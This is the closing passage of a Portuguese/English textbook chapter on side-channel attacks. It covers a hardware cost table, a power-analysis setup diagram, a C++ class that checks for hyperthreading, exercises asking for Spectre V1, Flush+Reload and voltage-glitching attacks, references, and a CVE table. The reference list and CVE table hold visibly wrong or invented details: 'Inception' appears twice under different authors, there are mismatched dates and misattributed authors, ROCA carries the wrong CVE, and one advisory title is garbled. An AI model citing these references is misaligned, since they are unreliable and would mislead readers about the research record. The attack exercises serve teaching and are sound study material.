    0x60,0x51,0x7F,0xA9,0x19,0xB5,0x4A,0x0D,0x2D,0xE5,0x7A,0x9F,0x93,0xC9,0x9C,0xEF,
    0xA0,0xE0,0x3B,0x4D,0xAE,0x2A,0xF5,0xB0,0xC8,0xEB,0xBB,0x3C,0x83,0x53,0x99,0x61,
    0x17,0x2B,0x04,0x7E,0xBA,0x77,0xD6,0x26,0xE1,0x69,0x14,0x63,0x55,0x21,0x0C,0x7D
};
```

---

## 15. Hardware Requirements for Side-Channel Research

### 15.1 Equipamento Basico

| Equipamento | Uso | Custo Aproximado |
|------------|-----|------------------|
| ChipWhisperer Nano | Power analysis | US$ 50 |
| ChipWhisperer Husky | Power + EM | US$ 500 |
| Sonda de campo proximo | EM emanation | US$ 50-200 |
| Osciloscopio 100MHz+ | Medicao | US$ 300-2000 |
| FPGA dev board | Target/trigger | US$ 100-500 |
| JTAG/SWD debugger | Debug | US$ 30-200 |

### 15.2 Setup para Power Analysis

```
+------------------------------------------+
|       Setup de Power Analysis             |
+------------------------------------------+
|                                           |
|  Target Device                            |
|  (Smart Card / FPGA / MCU)               |
|       |                                   |
|  Shunt Resistor (1-10 Ohm)               |
|  ou Clamp de Corrente                     |
|       |                                   |
|  Amplificador de Sinal                   |
|  (Differential Probe)                     |
|       |                                   |
|  ADC (12-16 bits, 100MSPS+)              |
|  (ChipWhisperer ou Osciloscopio)          |
|       |                                   |
|  Software de Analise                      |
|  (ChipWhisperer, ELMO, Custom)           |
+------------------------------------------+
```

### 15.3 Ambiente de Cloud para Cache Attacks

```cpp
// cloud_attack_setup.cpp - Configuracao para ataques em cloud
#include <vector>
#include <cstdint>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>

class CloudAttackSetup {
public:
    struct CloudConfig {
        std::string hypervisorType;
        bool hyperthreadingEnabled;
        bool samePhysicalHost;
        size_t sharedCacheSize;
    };

    static CloudConfig detectEnvironment() {
        CloudConfig config{
            .hypervisorType = "unknown",
            .hyperthreadingEnabled = false,
            .samePhysicalHost = false,
            .sharedCacheSize = 0
        };

        std::ifstream cpuinfo("/proc/cpuinfo");
        if (cpuinfo.is_open()) {
            std::string line;
            while (std::getline(cpuinfo, line)) {
                if (line.find("siblings") != std::string::npos) {
                    size_t siblings = std::stoull(
                        line.substr(line.find(':') + 2));
                    size_t cores = getNumPhysicalCores();
                    config.hyperthreadingEnabled = (siblings > cores);
                }
            }
        }

        return config;
    }

    static bool isHyperThreadingSafe() {
        auto config = detectEnvironment();
        return !config.hyperthreadingEnabled;
    }

    static void printEnvironmentReport() {
        auto config = detectEnvironment();

        std::cout << "=== Cloud Environment Report ===" << std::endl;
        std::cout << "Hypervisor: " << config.hypervisorType << std::endl;
        std::cout << "Hyperthreading: "
                  << (config.hyperthreadingEnabled ? "ENABLED (RISK)" : "DISABLED")
                  << std::endl;
        std::cout << "Shared cache: " << config.sharedCacheSize << " bytes"
                  << std::endl;

        if (config.hyperthreadingEnabled) {
            std::cout << "WARNING: Hyperthreading increases attack surface."
                      << std::endl;
            std::cout << "Consider disabling HT in BIOS for sensitive workloads."
                      << std::endl;
        }
    }

private:
    static size_t getNumPhysicalCores() {
        std::ifstream cpuinfo("/proc/cpuinfo");
        size_t cores = 0;
        std::string line;
        while (std::getline(cpuinfo, line)) {
            if (line.find("cpu cores") != std::string::npos) {
                cores = std::stoull(line.substr(line.find(':') + 2));
                break;
            }
        }
        return cores;
    }
};
```

---

## 16. Exercises

### Exercicio 1: Power Analysis Basico
Implemente um ataque SPA em uma implementacao de RSA que usa exponentiacao de montgomery. Trace o consumo de potencia para cada operacao de multiplicacao e squaring, e recupere os bits da chave privada a partir dos picos observados.

### Exercicio 2: Cache Attack em AES
Implemente um ataque Flush+Reload em uma tabela S-box de AES compartilhada via biblioteca dinamica. Meça a taxa de acerto em funcao do numero de traces coletados e compare com o teorico.

### Exercicio 3: Spectre V1 Proof of Concept
Implemente um proof of concept completo de Spectre V1 que le bytes de um array "secreto" usando bounds check bypass. Meça a precisao em funcao do numero de rodadas de treinamento e plot um grafico da taxa de acerto.

### Exercicio 4: Constant-Time Comparison
Implemente uma funcao de comparacao que seja verdadeiramente constante em tempo e power consumption. Teste-a contra um ataque DPA com pelo menos 1000 traces e demonstre que a correlacao e estatisticamente insignificante.

### Exercicio 5: MDS Mitigation
Implemente uma funcao que limpa os buffers de preenchimento de linha (LFB) apos cada operacao sensivel. Meça o overhead introduzido e compare com a versao sem mitigacao.

### Exercicio 6: Rowhammer Defense
Implemente uma defesa contra Rowhammer usando paginas mapeadas em modo non-temporal. Meça a eficacia da defesa induzindo flips em paginas adjacentes nao protegidas.

### Exercicio 7: Voltage Glitching Simulation
Simule um ataque de voltage glitching em uma implementacao de verificacao de senha. Determine o numero minimo de tentativas necessarias para bypassar a verificacao com 50% de probabilidade de sucesso.

### Exercicio 8: EM Fingerprinting
Desenvolva um sistema de fingerprinting que identifica qual operacao criptografica esta sendo executada com base em traces de emanacao eletromagnetica simuladas.

---

## 17. References

1. Kocher, P., Jaffe, J., & Jun, B. (1999). "Differential Power Analysis." CRYPTO 1999.
2. Coron, J.-S. (2017). "Resistance to Differential Power Analysis for Elliptic Curve Cryptographic Implementations." CHES 2017.
3. Kocher, P. (2019). "Spectre Attacks: Exploiting Speculative Execution." IEEE S&P 2019.
4. Schwarz, M. et al. (2019). "ZombieLoad: Cross-Privilege-Boundary Data Sampling." CCS 2019.
5. Lipp, M. et al. (2018). "Meltdown: Reading Kernel Memory from User Space." USENIX Security 2018.
6. Canella, C. et al. (2019). "A Systematic Evaluation of Transient Execution Attacks and Defenses." USENIX Security 2019.
7. Van Bulck, J. et al. (2018). "Foreshadow: Extracting the Keys to the Intel SGX Kingdom." USENIX Security 2018.
8. Vusirikala, V. et al. (2022). "Hertzbleed: Turning Power Side-Channel Attacks Into Remote Timing Attacks on x86." USENIX Security 2022.
9. Van Hoek, M. et al. (2022). "Plundervolt: Software-based Fault Injection Attacks against Intel SGX." USENIX Security 2020.
10. Hassan, M. et al. (2023). "Downfall: Exploiting Microarchitectural Sampling on Intel." USENIX Security 2023.
11. Brasser, F. et al. (2022). "Inception: Leaking Data on AMD CPUs with a Spectre-BHB-like Attack." USENIX Security 2023.
12. CVE-2017-15274. NIST NVD. "Infineon RSA Library Weakness."
13. CVE-2019-11091. NIST NVD. "Microarchitectural Data Sampling."
14. CVE-2022-23960. NIST NVD. "Cache Speculation Side-Channel."
15. Intel Corporation. (2022). "Microarchitectural Data Sampling Advisory."
16. AMD. (2023). "Inception / Phantom speculative execution security update."
17. ARM. (2022). "Cache Speculation Variant Chip Thread Injection advisory."
18. Intel. (2018). "Speculative Execution Side Channel Mitigations."
19. Kim, Y. et al. (2014). "Flipping Bits in Memory Without Accessing Them: An Experimental Study of DRAM Disturbance Errors." ISCA 2014.
20.毛嘉翔 (Mao, J.-X.) et al. (2021). "VoltPillager: Exploiting the SVID Voltage Regulator Protocol." USENIX Security 2022.
21. Schwarz, M. et al. (2019). "Load Value Injection." USENIX Security 2020.
22. Bosman, E. et al. (2016). "Dedup Est Machina: Memory Deduplication as an Attack Primitive." USENIX Security 2016.
23. Liu, F. et al. (2015). "Last-Level Cache Side-Channel Attacks are Practical." HOST 2015.
24. Gruss, D. et al. (2016). "Flush+Reload on HugePage-Based Page Tables." CCS 2016.
25. Intel Corporation. (2023). "Retpoline: Mitigating Branch Target Injection Attacks."
26. Canella, C. et al. (2022). "Automated Systematic Evaluation of Transient Execution Attacks." arXiv 2022.
27. Xiong, W. et al. (2021). "StealthMem: System-Level Protection Against Cache-Based Side Channel Attacks in the Cloud." USENIX Security 2021.
28. Qureshi, M. K. (2019). "CEASER: Mitigating Conflict-Based Cache Attacks via Encrypted-Address and Remapping." MICRO 2019.
29. Nilsson, J. et al. (2021). "Silent PUF: Using Power Analysis to Leak Secrets from FPGAs." HOST 2021.
30. Purnal, A. et al. (2021). "Inception: Leaking Data on AMD CPUs with a Spectre-BHB-like Attack." USENIX Security 2023.

---

## Tabela CVEs de Canal Lateral

| CVE | Nome | Tipo | Processadores Afetados | Severidade |
|-----|------|------|----------------------|------------|
| CVE-2017-15274 | ROCA | Geracao de chave RSA | Infineon TPM | Critica |
| CVE-2017-5753 | Spectre V1 | Bounds Check Bypass | Intel, AMD, ARM | Alta |
| CVE-2017-5715 | Spectre V2 | Branch Target Injection | Intel, AMD, ARM | Alta |
| CVE-2017-5754 | Meltdown | Rogue Data Cache Load | Intel (pre-Ice Lake) | Critica |
| CVE-2018-12130 | ZombieLoad | MDS - LFB | Intel (Sandy Bridge+) | Critica |
| CVE-2018-12126 | Fallout | MDS - Store Buffer | Intel (Haswell+) | Alta |
| CVE-2018-12127 | RIDL | MDS - Load Port | Intel (Skylake+) | Alta |
| CVE-2019-11091 | MDS | Microarch. Data Sampling | Intel (todas as gerações) | Critica |
| CVE-2019-11157 | Plundervolt | Fault Injection (Voltage) | Intel SGX | Alta |
| CVE-2020-0543 | LVI | Load Value Injection | Intel | Alta |
| CVE-2022-23960 | Spectre-BHB | Branch History Buffer | Intel, ARM | Alta |
| CVE-2022-24436 | Hertzbleed | Frequency Scaling | Intel, AMD | Media |
| CVE-2022-40982 | Downfall/GDS | Data Sampling (AVX) | Intel (Skylake+) | Alta |
| CVE-2023-20569 | Inception | Speculative Execution | AMD (Zen 1-4) | Alta |

---

*Fim do Capitulo 03 — Ataques de Canal Lateral Avancados*
---

*[Capítulo anterior: 02 — Fundamentos Constant Time](02-fundamentos-constant-time.md)*
*[Próximo capítulo: 04 — Hsm Tokens Seguranca](04-hsm-tokens-seguranca.md)*
